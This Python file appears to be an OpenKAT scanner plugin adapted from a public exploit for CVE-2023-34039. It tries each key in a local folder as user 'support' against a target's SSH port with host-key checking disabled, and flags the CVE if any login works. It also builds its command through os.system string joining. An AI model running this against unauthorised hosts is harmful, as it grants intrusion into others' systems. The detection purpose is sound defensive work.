"""
From:

https://github.com/sinsinology/CVE-2023-34039/blob/main/CVE-2023-34039.py

VMWare Aria Operations for Networks (vRealize Network Insight) Static SSH key RCE (CVE-2023-34039)
Version: All versions from 6.0 to 6.10
Discovered by: Harsh Jaiswal (@rootxharsh) and Rahul Maini (@iamnoooob) at ProjectDiscovery Research
Exploit By: Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)
A root cause analysis of the vulnerability can be found on my blog:
https://summoning.team/blog/vmware-vrealize-network-insight-ssh-key-rce-cve-2023-34039/

(*) Exploit by Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)

"""

import os


def run(boefje_meta: dict) -> list[tuple[set, str | bytes]]:
    input_ = boefje_meta["arguments"]["input"]  # input is IPService
    ip_port = input_["ip_port"]
    if input_["service"]["name"] != "ssh":
        return [({"info/boefje"}, "Skipping because service is not an ssh service")]

    ip = ip_port["address"]["address"]
    port = ip_port["port"]

    for root, dirs, files in os.walk("keys"):
        for file in files:
            key_file = str(os.path.join(root, file))
            ssh_command = [
                "ssh",
                "-i",
                key_file,
                "support@" + ip,
                "-p",
                port,
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-o",
                "BatchMode=yes",
                "exit",
                "2>/dev/null",
            ]
            try:
                coutput = os.system(" ".join(ssh_command))  # noqa: S605
                if coutput not in (0, 32512):  # 0 = it worked, 32512 = `exit` does not exists but we did connect
                    continue
                return [
                    (
                        set(),
                        "\n".join(
                            (str(coutput), f"{key_file} is allowed access to vRealize Network Insight on {ip}:{port}")
                        ),
                    ),
                    ({"openkat/finding"}, "CVE-2023-34039"),
                ]

            except Exception:  # noqa: S112
                continue
    return [(set(), "No known keys allowed")]
